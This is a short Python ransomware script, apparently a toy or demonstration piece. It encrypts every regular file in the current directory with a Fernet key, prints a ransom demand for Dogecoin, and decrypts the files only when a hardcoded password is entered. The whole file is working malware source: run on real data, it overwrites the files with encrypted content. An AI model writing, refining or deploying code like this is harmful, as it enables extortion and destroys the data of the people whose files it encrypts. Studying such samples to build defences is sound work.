#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

print("""
_______________________________________________________________________________
 _    _                  _                                                     |
| |  | |                | |  _                       _    ______   ______      |
| |  | |  _    ______   | | / /   _      _    ______| |  |     |  |  ____|     |
| |  | | | |  |  ____|  | |/ /   | |    | |  |  __  | |  |     |  | |____      |
\ \  / / | |  | |       |   <    | | /\ | |  | |  | | |  |    /   |  ____|     |
 \ \/ /  | |  |  ____   | |\ \   \ \/  \/ /  | |__| | |  | |\ \   | |____      |
  \__/   |_|  |______|  |_| \_\   \/    \/   |______| |  |_| \_\  |______|     |
                                                    \_|                        |
   HAVE FUN!!                                                                  |
_______________________________________________________________________________|                                                   
\n""")
files=[]
for file in os.listdir():
	if file=="ransom.py" or file=="thekey.key":
		continue
	if os.path.isfile(file):
		files.append(file)  
key=Fernet.generate_key()

with open("thekey.key","wb") as thekey:
	thekey.write(key)
for file in files:
	with open(file,"rb") as thefile:
		content=thefile.read()
	content_encrypted=Fernet(key).encrypt(content)
	with open(file,"wb") as thefile:
		thefile.write(content_encrypted)
print("I OWN YOR FILES NOW!! SEND ME  DOGE OR LOSE THEM FOREVER!!")
print("IMMA SEND YOU THE DECRYPT KEY ONCE I RECEIVE THE CRYPTO\nENTER DECRYPT KEY:")
while(True):
	decKey=input()
	if decKey=="letMeIn":
		with open("thekey.key","rb") as thekey:
        		 secretKey=thekey.read()
		for file in files:
        		with open(file,"rb") as thefile:
                		content=thefile.read()
        		content_decrypted=Fernet(secretKey).decrypt(content)
        		with open(file,"wb") as thefile:
                		thefile.write(content_decrypted)
		print("YOUR FILES ARE DECRYPTED!!")
		break
	else:
		print("IMMA NEED SOME MORE DOGE MY GUY!!\nENTER THE KEY:")

